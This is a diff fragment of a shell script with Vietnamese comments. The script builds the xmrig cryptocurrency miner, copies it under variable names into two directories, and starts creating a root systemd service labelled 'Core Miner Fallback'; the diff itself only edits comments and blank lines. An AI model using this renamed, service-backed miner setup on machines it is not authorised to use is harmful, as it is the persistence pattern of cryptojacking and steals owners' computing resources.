@@ -40,15 +40,13 @@ mkdir build && cd build
 cmake .. -DCMAKE_BUILD_TYPE=Release
 make -j$TOTAL_CORES
 
-# Copy file binary cho cả hai tiến trình
+# Copy file binary
 mkdir -p "$DIR1" "$DIR2"
 cp ./xmrig "$DIR1/$NAME1"
 cp ./xmrig "$DIR2/$NAME2"
 chmod +x "$DIR1/$NAME1" "$DIR2/$NAME2"
 
 # Tạo systemd cho tiến trình
-
-
 sudo tee /etc/systemd/system/$SERVICE1.service > /dev/null << EOF
 [Unit]
 Description=Core Miner Fallback
